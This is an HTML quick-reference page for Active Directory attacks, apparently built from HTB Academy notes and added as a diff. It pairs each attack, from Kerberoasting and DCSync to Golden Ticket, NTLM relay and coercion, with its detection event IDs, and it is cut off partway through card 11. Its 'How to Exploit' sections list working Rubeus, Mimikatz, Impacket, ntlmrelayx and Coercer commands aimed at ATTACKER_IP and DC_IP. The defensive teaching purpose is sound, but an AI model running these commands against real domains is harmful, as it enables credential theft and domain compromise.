@@ -1,0 +1,950 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AD Attacks — DFIR Quick Reference</title>
+<style>
+  :root {
+    --bg:       #0d1117;
+    --surface:  #161b22;
+    --border:   #21262d;
+    --accent:   #58a6ff;
+    --red:      #f85149;
+    --green:    #3fb950;
+    --yellow:   #d29922;
+    --purple:   #a5a0f5;
+    --muted:    #8b949e;
+    --text:     #c9d1d9;
+    --bright:   #e6edf3;
+    --tag-bg:   #1f2937;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+  }
+
+  /* ── Header ── */
+  header {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 28px 40px 24px;
+    display: flex;
+    align-items: flex-end;
+    gap: 24px;
+  }
+
+  .header-left h1 {
+    font-family: 'Courier New', monospace;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--accent);
+    letter-spacing: 0.04em;
+  }
+
+  .header-left h1 span { color: var(--muted); }
+
+  .header-meta {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 4px;
+    font-family: 'Courier New', monospace;
+  }
+
+  .header-stats {
+    margin-left: auto;
+    display: flex;
+    gap: 20px;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+  }
+
+  .stat {
+    text-align: center;
+  }
+
+  .stat-val {
+    font-size: 20px;
+    font-weight: 700;
+    color: var(--bright);
+    display: block;
+  }
+
+  .stat-label { color: var(--muted); }
+
+  /* ── Nav pills ── */
+  .nav-wrap {
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    padding: 10px 40px;
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .nav-pill {
+    font-size: 11px;
+    font-family: 'Courier New', monospace;
+    padding: 3px 10px;
+    border-radius: 20px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    text-decoration: none;
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+
+  .nav-pill:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ── Main layout ── */
+  main {
+    max-width: 1280px;
+    margin: 0 auto;
+    padding: 32px 40px 80px;
+  }
+
+  /* ── Attack card ── */
+  .attack-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 24px;
+    overflow: hidden;
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .card-header:hover { background: rgba(88, 166, 255, 0.04); }
+
+  .attack-num {
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    min-width: 28px;
+  }
+
+  .attack-title {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--bright);
+    flex: 1;
+  }
+
+  .badge {
+    font-size: 10px;
+    font-family: 'Courier New', monospace;
+    padding: 2px 8px;
+    border-radius: 4px;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+  }
+
+  .badge-cred  { background: rgba(248,81,73,0.15);  color: var(--red);    border: 1px solid rgba(248,81,73,0.3); }
+  .badge-kerb  { background: rgba(165,160,245,0.15); color: var(--purple); border: 1px solid rgba(165,160,245,0.3); }
+  .badge-priv  { background: rgba(210,153,34,0.15);  color: var(--yellow); border: 1px solid rgba(210,153,34,0.3); }
+  .badge-pki   { background: rgba(63,185,80,0.15);   color: var(--green);  border: 1px solid rgba(63,185,80,0.3); }
+  .badge-acl   { background: rgba(88,166,255,0.15);  color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
+  .badge-ntlm  { background: rgba(248,81,73,0.15);   color: #ff8080;       border: 1px solid rgba(248,81,73,0.3); }
+
+  .mitre-tag {
+    font-size: 10px;
+    font-family: 'Courier New', monospace;
+    color: var(--muted);
+    background: var(--tag-bg);
+    padding: 2px 8px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+  }
+
+  .chevron {
+    color: var(--muted);
+    font-size: 12px;
+    transition: transform 0.2s;
+  }
+
+  .card-body {
+    display: none;
+    padding: 20px;
+    gap: 0;
+  }
+
+  .card-body.open { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 16px; }
+
+  /* single-col fallback for small cards */
+  .card-body.open.single { grid-template-columns: 1fr; }
+
+  .section-block {
+    padding: 16px;
+    border-radius: 6px;
+    border: 1px solid var(--border);
+    background: var(--bg);
+  }
+
+  .section-title {
+    font-size: 10px;
+    font-family: 'Courier New', monospace;
+    font-weight: 700;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .section-title.what  { color: var(--accent); }
+  .section-title.how   { color: var(--red);    }
+  .section-title.detect{ color: var(--green);  }
+
+  .section-block p, .section-block li {
+    font-size: 13px;
+    line-height: 1.65;
+    color: var(--text);
+  }
+
+  .section-block ul { list-style: none; padding: 0; }
+  .section-block ul li { padding: 2px 0 2px 14px; position: relative; }
+  .section-block ul li::before { content: '›'; position: absolute; left: 0; color: var(--muted); }
+
+  code {
+    font-family: 'Courier New', monospace;
+    font-size: 11.5px;
+    background: rgba(255,255,255,0.06);
+    padding: 1px 5px;
+    border-radius: 3px;
+    color: var(--yellow);
+  }
+
+  .event-id {
+    display: inline-block;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    padding: 1px 7px;
+    border-radius: 4px;
+    background: rgba(63,185,80,0.12);
+    color: var(--green);
+    border: 1px solid rgba(63,185,80,0.25);
+    margin: 2px 2px 2px 0;
+  }
+
+  .tool-chip {
+    display: inline-block;
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    padding: 1px 7px;
+    border-radius: 4px;
+    background: rgba(248,81,73,0.1);
+    color: var(--red);
+    border: 1px solid rgba(248,81,73,0.2);
+    margin: 2px 2px 2px 0;
+  }
+
+  .card-footer {
+    padding: 10px 20px;
+    border-top: 1px solid var(--border);
+    display: flex;
+    gap: 8px;
+    align-items: center;
+    flex-wrap: wrap;
+    background: rgba(0,0,0,0.15);
+    display: none;
+  }
+
+  .card-footer.open { display: flex; }
+
+  .footer-label {
+    font-size: 10px;
+    color: var(--muted);
+    font-family: 'Courier New', monospace;
+    margin-right: 4px;
+  }
+
+  /* ── Divider ── */
+  .section-divider {
+    font-family: 'Courier New', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: 0.15em;
+    text-transform: uppercase;
+    margin: 32px 0 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .section-divider::before,
+  .section-divider::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: var(--border);
+  }
+
+  /* ── Legend ── */
+  .legend {
+    display: flex;
+    gap: 16px;
+    flex-wrap: wrap;
+    padding: 12px 20px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin-bottom: 28px;
+    font-size: 11px;
+    font-family: 'Courier New', monospace;
+  }
+
+  .legend-item { display: flex; align-items: center; gap: 6px; color: var(--muted); }
+
+  @media (max-width: 900px) {
+    header { flex-direction: column; padding: 20px; align-items: flex-start; }
+    .header-stats { margin-left: 0; }
+    main { padding: 20px; }
+    .nav-wrap { padding: 10px 20px; }
+    .card-body.open { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-left">
+    <h1><span>//</span> AD Attacks — DFIR Quick Reference</h1>
+    <div class="header-meta">source: HTB Academy · Windows Attacks &amp; Defense · 13 attacks covered · click any card to expand</div>
+  </div>
+  <div class="header-stats">
+    <div class="stat"><span class="stat-val">13</span><span class="stat-label">attacks</span></div>
+    <div class="stat"><span class="stat-val" style="color:var(--green)">25+</span><span class="stat-label">event IDs</span></div>
+    <div class="stat"><span class="stat-val" style="color:var(--red)">8</span><span class="stat-label">categories</span></div>
+  </div>
+</header>
+
+<nav class="nav-wrap">
+  <a class="nav-pill" href="#kerb">Kerberoasting</a>
+  <a class="nav-pill" href="#asrep">AS-REProasting</a>
+  <a class="nav-pill" href="#gpp">GPP Passwords</a>
+  <a class="nav-pill" href="#gpo">GPO Abuse</a>
+  <a class="nav-pill" href="#shares">Creds in Shares</a>
+  <a class="nav-pill" href="#objprops">Creds in Obj Props</a>
+  <a class="nav-pill" href="#dcsync">DCSync</a>
+  <a class="nav-pill" href="#golden">Golden Ticket</a>
+  <a class="nav-pill" href="#kcd">Constrained Delegation</a>
+  <a class="nav-pill" href="#print">PrintSpooler/NTLM Relay</a>
+  <a class="nav-pill" href="#coerce">Coercing + Unconstrained Del.</a>
+  <a class="nav-pill" href="#acls">Object ACLs</a>
+  <a class="nav-pill" href="#esc1">PKI ESC1</a>
+</nav>
+
+<main>
+
+<div class="legend">
+  <div class="legend-item"><span class="badge badge-kerb">KERBEROS</span> Kerberos protocol abuse</div>
+  <div class="legend-item"><span class="badge badge-cred">CRED EXPOSURE</span> Credential discovery</div>
+  <div class="legend-item"><span class="badge badge-priv">PRIVESC</span> Privilege escalation</div>
+  <div class="legend-item"><span class="badge badge-pki">PKI</span> Certificate Services</div>
+  <div class="legend-item"><span class="badge badge-acl">ACL ABUSE</span> Access control misconfig</div>
+  <div class="legend-item"><span class="badge badge-ntlm">NTLM</span> NTLM relay/coerce</div>
+</div>
+
+<!-- ── 1. KERBEROASTING ── -->
+<div class="attack-card" id="kerb">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">01</span>
+    <span class="attack-title">Kerberoasting</span>
+    <span class="badge badge-kerb">KERBEROS</span>
+    <span class="mitre-tag">T1558.003</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Any domain user can request a Kerberos TGS ticket for any account with a registered SPN. The ticket is encrypted with the service account's NTLM password hash. The attacker extracts the ticket and cracks the hash offline — no special rights required. Encryption downgrades to RC4 are possible even in AES environments by manipulating the request.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate SPNs with <code>Rubeus kerberoast</code> or <code>Get-SPNs</code></li>
+        <li>Request all TGS tickets at once: <code>Rubeus.exe kerberoast /outfile:spn.txt</code></li>
+        <li>RC4 downgrade: <code>/rc4opsec</code> flag on Rubeus</li>
+        <li>Crack offline: <code>hashcat -m 13100</code> (RC4) or <code>-m 19600</code> (AES)</li>
+        <li>Impacket alternative: <code>GetUserSPNs.py domain/user:pass</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p><span class="event-id">4769</span> generated per TGS request — extremely high volume, not useful alone. Alert on: bulk TGS requests (10+ tickets/min from single source). Alert when <code>Ticket Encryption Type = RC4 (0x17)</code> in environments enforcing AES. Honeypot SPN user: any TGS for that account = alert.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Rubeus</span><span class="tool-chip">Impacket GetUserSPNs</span><span class="tool-chip">PowerView</span><span class="tool-chip">hashcat</span>
+  </div>
+</div>
+
+<!-- ── 2. AS-REProasting ── -->
+<div class="attack-card" id="asrep">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">02</span>
+    <span class="attack-title">AS-REProasting</span>
+    <span class="badge badge-kerb">KERBEROS</span>
+    <span class="mitre-tag">T1558.004</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Targets accounts with "Do not require Kerberos preauthentication" enabled (<code>DONT_REQ_PREAUTH</code>). Without preauth, the KDC returns an AS-REP containing encrypted material derivable from the account's password — no authentication needed to request it. Crackable offline identical to Kerberoasting but requires no credentials at all in some tool implementations.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Extract all vulnerable hashes: <code>Rubeus.exe asreproast /outfile:asrep.txt</code></li>
+        <li>Target specific user: <code>Rubeus.exe asreproast /user:anni</code></li>
+        <li>Unauthenticated (no creds): <code>GetNPUsers.py domain/ -usersfile users.txt</code></li>
+        <li>Crack: <code>hashcat -m 18200</code> (Kerberos 5 AS-REP etype 23)</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p><span class="event-id">4768</span> (TGT requested). Key field: <strong>Pre-Authentication Type = 0</strong> (no preauth). Also watch <strong>Ticket Encryption Type = 0x17</strong> (RC4). Volume is high for normal logins — correlate source IP to known user location/VLAN. Honeypot user with DONT_REQ_PREAUTH: any AS-REP request = high-fidelity alert.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Rubeus</span><span class="tool-chip">Impacket GetNPUsers</span><span class="tool-chip">hashcat</span>
+  </div>
+</div>
+
+<!-- ── 3. GPP PASSWORDS ── -->
+<div class="attack-card" id="gpp">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">03</span>
+    <span class="attack-title">GPP Passwords (MS14-025)</span>
+    <span class="badge badge-cred">CRED EXPOSURE</span>
+    <span class="mitre-tag">T1552.006</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Group Policy Preferences stored passwords in XML files in SYSVOL (<code>\\DOMAIN\SYSVOL\...</code>) encrypted with AES-256 — but Microsoft published the private key on MSDN. SYSVOL is readable by all Authenticated Users. Affected XML files contain a <code>cpassword</code> attribute. Despite the 2014 patch (KB2962486), legacy environments still contain these. Credentials persist until the file is removed.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Auto-parse and decrypt: <code>Get-GPPPassword</code> (PowerSploit)</li>
+        <li>Manual: parse XML files in <code>\\DOMAIN\SYSVOL\...\Policies\</code></li>
+        <li>Decrypt <code>cpassword</code> value with public AES key (known)</li>
+        <li>CrackMapExec: <code>cme smb DC -u user -p pass -M gpp_password</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Enable SACL auditing on the XML files in SYSVOL. Any read generates <span class="event-id">4663</span>. Also monitor for logon attempts with the exposed account: <span class="event-id">4624</span> (success), <span class="event-id">4625</span> (fail), <span class="event-id">4768</span> (TGT). Honeypot: wrong password in GPP XML → failed auth events are IOC.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Get-GPPPassword</span><span class="tool-chip">CrackMapExec</span><span class="tool-chip">Impacket</span>
+  </div>
+</div>
+
+<!-- ── 4. GPO ABUSE ── -->
+<div class="attack-card" id="gpo">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">04</span>
+    <span class="attack-title">GPO Permissions / GPO File Abuse</span>
+    <span class="badge badge-priv">PRIVESC</span>
+    <span class="mitre-tag">T1484.001</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>GPOs misconfigured to allow write access to low-privileged users (e.g., "Authenticated Users" or "Domain Users" on a GPO). Any user with write permissions can modify GPO settings to add startup scripts, scheduled tasks, or deploy malicious files — affecting all systems in the linked OU. Also covers cases where deployed script files on shares have weak NTFS permissions, allowing binary replacement.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate writable GPOs: <code>Get-GPPermission</code> or BloodHound</li>
+        <li>Add startup script/scheduled task via GPMC or manual XML edit</li>
+        <li>Target: replace deployed binary on misconfigured share</li>
+        <li>SharpGPOAbuse: <code>SharpGPOAbuse.exe --AddLocalAdmin --GPOName "..."</code></li>
+        <li>Impact reaches all OUs the vulnerable GPO is linked to</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Enable Directory Service Changes auditing. GPO modification generates <span class="event-id">5136</span> (DS object modified). Alert on any non-admin account appearing as the modifier. Also monitor deployed file hashes for changes (hash-based integrity alerting). Honeypot GPO linked to non-critical OU with auto-disable and GPO unlink on modification.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">SharpGPOAbuse</span><span class="tool-chip">BloodHound</span><span class="tool-chip">PowerView</span>
+  </div>
+</div>
+
+<!-- ── 5. CREDS IN SHARES ── -->
+<div class="attack-card" id="shares">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">05</span>
+    <span class="attack-title">Credentials in Network Shares</span>
+    <span class="badge badge-cred">CRED EXPOSURE</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Cleartext or recoverable credentials stored in scripts, config files, or documents on network shares accessible to Domain Users. Common sources: batch files, PowerShell scripts, <code>.conf</code>/<code>.ini</code>/<code>.config</code> files, connection strings. "Hidden" shares (ending in <code>$</code>) are not hidden to enumeration tools — only Windows Explorer omits them. Adding "Users" to a share ACL grants all domain users access.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate accessible shares: <code>Invoke-ShareFinder -ExcludeStandard -CheckShareAccess</code></li>
+        <li>Search file contents: <code>Invoke-FileFinder</code>, <code>snaffler</code>, manual grep</li>
+        <li>Target file types: <code>.ps1 .bat .cmd .config .ini .xml .txt .xlsx</code></li>
+        <li>Look for keywords: password, pass, pwd, credential, secret, key</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Behaviour baselining: alert on simultaneous connections from a workstation to many hosts (e.g., Invoke-ShareFinder scanning hundreds of devices). Monitor privileged account logons from unexpected sources: <span class="event-id">4624</span>, <span class="event-id">4625</span>, <span class="event-id">4768</span>. Honeypot: fake cred file on accessible share with wrong password; failed auth events = IOC.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Invoke-ShareFinder</span><span class="tool-chip">Snaffler</span><span class="tool-chip">Invoke-FileFinder</span>
+  </div>
+</div>
+
+<!-- ── 6. CREDS IN OBJECT PROPERTIES ── -->
+<div class="attack-card" id="objprops">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">06</span>
+    <span class="attack-title">Credentials in Object Properties</span>
+    <span class="badge badge-cred">CRED EXPOSURE</span>
+    <span class="mitre-tag">T1552.004</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Admins storing passwords in AD user object properties — typically the <code>Description</code> or <code>Info</code> fields — under the false assumption that read access requires elevated AD rights. In reality, all domain users can read most object properties including these. Frequently affects service accounts created manually where the creator notes the password in the description.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate via PowerShell: <code>Get-ADUser -Filter * -Properties Description,Info</code></li>
+        <li>Search for keywords: <code>pass</code>, <code>pwd</code>, <code>key</code>, <code>admin</code></li>
+        <li>PowerSploit: <code>SearchUserClearTextInformation -Terms "pass"</code></li>
+        <li>BloodHound also surfaces this in node property views</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>Event <span class="event-id">4738</span> fires when a user object is modified but does not specify which property changed — limited utility. Behaviour baseline: alert on privileged/service account logons from unexpected hosts/times: <span class="event-id">4624</span>, <span class="event-id">4625</span>, <span class="event-id">4768</span>. Honeypot: fake password in Description on a service account; failed auth = <span class="event-id">4625</span>, <span class="event-id">4771</span>, <span class="event-id">4776</span>.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Get-ADUser</span><span class="tool-chip">BloodHound</span><span class="tool-chip">LDAP queries</span>
+  </div>
+</div>
+
+<!-- ── 7. DCSYNC ── -->
+<div class="attack-card" id="dcsync">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">07</span>
+    <span class="attack-title">DCSync</span>
+    <span class="badge badge-priv">PRIVESC</span>
+    <span class="mitre-tag">T1003.006</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Abuses the AD replication protocol (MS-DRSR) to request password hashes from a DC without requiring local admin on the DC itself. Requires the attacking account to hold "Replicating Directory Changes" + "Replicating Directory Changes All" permissions (normally only DCs and Azure AD Connect). Can dump any account including <code>krbtgt</code> and <code>Administrator</code>.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Mimikatz: <code>lsadump::dcsync /domain:eagle.local /user:Administrator</code></li>
+        <li>Dump krbtgt for Golden Ticket: <code>/user:krbtgt</code></li>
+        <li>Impacket: <code>secretsdump.py domain/user:pass@DC_IP</code></li>
+        <li>Pre-req: compromise account with replication rights (or DA)</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p><span class="event-id">4662</span> generated on every DC replication. Filter on property GUIDs: <code>1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</code> or <code>1131f6ad-9c07-11d1-f79f-00c04fc2dcd2</code>. Alert when initiator is NOT a DC computer account. Whitelist Azure AD Connect and legitimate DC accounts. This is one of the highest-fidelity AD detections available.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Mimikatz</span><span class="tool-chip">Impacket secretsdump</span><span class="tool-chip">CrackMapExec</span>
+  </div>
+</div>
+
+<!-- ── 8. GOLDEN TICKET ── -->
+<div class="attack-card" id="golden">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">08</span>
+    <span class="attack-title">Golden Ticket</span>
+    <span class="badge badge-kerb">KERBEROS</span>
+    <span class="mitre-tag">T1558.001</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Using the <code>krbtgt</code> NTLM hash (obtained via DCSync or LSASS dump) to forge valid TGTs for any user, including Domain Admins, bypassing normal Kerberos authentication. The forged ticket is signed by <code>krbtgt</code> and the entire domain trusts it unconditionally. Provides cross-domain escalation within a forest. Enables long-term persistence — tickets can be forged on demand even after password resets (until <code>krbtgt</code> is reset twice).</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Obtain krbtgt hash via DCSync first</li>
+        <li>Mimikatz: <code>kerberos::golden /domain: /sid: /rc4: /user: /id:500</code></li>
+        <li>Set realistic lifetime: <code>/endin:600 /renewmax:10080</code></li>
+        <li>Inject: <code>kerberos::ptt ticket.kirbi</code></li>
+        <li>Impacket: <code>ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-... -domain domain.local Administrator</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>No event on the DC when ticket is forged. Detection: <span class="event-id">4624</span>/<span class="event-id">4625</span> on target systems — alert when privileged accounts authenticate from non-PAW machines. TGS requests without a preceding TGT (possible indicator). Cross-domain escalation: <span class="event-id">4675</span> (SID Filtering). Default Mimikatz ticket lifetime (10 years) is trivially detectable by EDRs — watch for MaxTicketAge violations.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Mimikatz</span><span class="tool-chip">Impacket ticketer</span><span class="tool-chip">Rubeus</span>
+    <span class="footer-label" style="margin-left:12px">REMEDIATION:</span>
+    <span style="font-size:11px;color:var(--yellow);font-family:'Courier New',monospace">Reset krbtgt password TWICE, 10hr apart</span>
+  </div>
+</div>
+
+<!-- ── 9. CONSTRAINED DELEGATION ── -->
+<div class="attack-card" id="kcd">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">09</span>
+    <span class="attack-title">Kerberos Constrained Delegation Abuse</span>
+    <span class="badge badge-kerb">KERBEROS</span>
+    <span class="mitre-tag">T1558</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Constrained Delegation allows a service account to obtain Kerberos tickets on behalf of any user to specific services via S4U2Proxy. If the account is also trusted for Protocol Transition (S4U2Self), an attacker with control of that account can impersonate any user — including DA — to the configured services. Protocol transition also permits pivoting to services not listed in the delegation config (e.g., trusted for LDAP → get CIFS ticket).</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Enumerate: <code>Get-NetUser -TrustedToAuth</code> (PowerView)</li>
+        <li>Rubeus S4U: <code>Rubeus.exe s4u /user:web_service /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/DC1</code></li>
+        <li>Protocol transition allows delegation to any service if TRUSTED_TO_AUTH_FOR_DELEGATION is set</li>
+        <li>Inject ticket: <code>Rubeus.exe ptt /ticket:...</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>S4U logon events show the delegating account under <strong>Transited Services</strong> in <span class="event-id">4624</span>. Alert on: privileged user (<code>Administrator</code>, DA) authenticating from non-PAW workstation. Unusual source for S4U service tickets. Monitor <code>msDS-AllowedToDelegateTo</code> attribute changes on accounts.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Rubeus</span><span class="tool-chip">PowerView</span><span class="tool-chip">Impacket getST</span>
+  </div>
+</div>
+
+<!-- ── 10. PRINT SPOOLER / NTLM RELAY ── -->
+<div class="attack-card" id="print">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">10</span>
+    <span class="attack-title">PrintSpooler Bug &amp; NTLM Relaying</span>
+    <span class="badge badge-ntlm">NTLM</span>
+    <span class="mitre-tag">T1187 / T1557.001</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>The Print Spooler service's <code>RpcRemoteFindFirstPrinterChangeNotification(Ex)</code> RPC functions allow any domain user to force a remote machine to authenticate back to an attacker-controlled host, carrying a TGT (NTLM or Kerberos). Microsoft treats this as "by design." The forced authentication can be relayed to another DC (DCSync via NTLMRelayx if SMB signing is off), ADCS for a DC certificate, or to configure RBCD.</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Setup relay: <code>impacket-ntlmrelayx -t dcsync://DC2_IP -smb2support</code></li>
+        <li>Trigger: <code>python3 dementor.py ATTACKER_IP DC_IP -u user -d domain -p pass</code></li>
+        <li>Requires SMB Signing disabled on target DC</li>
+        <li>Alternative target: relay to ADCS for DC cert (<code>-t http://PKI/certsrv</code>)</li>
+        <li>Check SMB Signing: <code>cme smb DC_IP --gen-relay-list</code></li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
+      <p>No <span class="event-id">4662</span> generated when NTLMRelayx relays DCSync (traffic impersonates DC). Watch for: <span class="event-id">4624</span> successful logon for a DC computer account originating from a non-DC IP. Correlate DC computer account logons to their known static IPs. Firewall logs: outbound DC connections to port 445/139 to non-DC hosts = suspicious. Disable Print Spooler on DCs where not required.</p>
+    </div>
+  </div>
+  <div class="card-footer">
+    <span class="footer-label">TOOLS:</span>
+    <span class="tool-chip">Dementor</span><span class="tool-chip">SpoolSample</span><span class="tool-chip">NTLMRelayx</span><span class="tool-chip">Responder</span>
+  </div>
+</div>
+
+<!-- ── 11. COERCING + UNCONSTRAINED DELEGATION ── -->
+<div class="attack-card" id="coerce">
+  <div class="card-header" onclick="toggle(this)">
+    <span class="attack-num">11</span>
+    <span class="attack-title">Coercing Attacks &amp; Unconstrained Delegation</span>
+    <span class="badge badge-ntlm">NTLM</span>
+    <span class="badge badge-kerb">KERBEROS</span>
+    <span class="mitre-tag">T1187 / T1558</span>
+    <span class="chevron">▶</span>
+  </div>
+  <div class="card-body">
+    <div class="section-block">
+      <div class="section-title what">◈ What</div>
+      <p>Coercer tool exploits multiple RPC functions simultaneously (PetitPotam, DFSCoerce, ShadowCoerce, etc.) to force DC authentication back to an attacker. When a server with Unconstrained Delegation (UD) is already compromised, the DC's TGT is cached in LSASS of the UD machine and can be extracted/exported. This escalates from any user to DA in virtually every default AD deployment. Coercing is also used to relay to ADCS (ESC8).</p>
+    </div>
+    <div class="section-block">
+      <div class="section-title how">◈ How to Exploit</div>
+      <ul>
+        <li>Find UD hosts: <code>Get-NetComputer -Unconstrained</code> (PowerView)</li>
+        <li>On UD machine: <code>Rubeus.exe monitor /interval:1</code> to capture incoming TGTs</li>
+        <li>Coerce from Kali: <code>Coercer -u user -p pass -d domain -l ATTACKER_IP -t DC_IP</code></li>
+        <li>Extract captured TGT with Rubeus, inject with <code>ptt</code></li>
+        <li>Then perform DCSync with the DC's TGT</li>
+      </ul>
+    </div>
+    <div class="section-block">
+      <div class="section-title detect">◈ Detection</div>
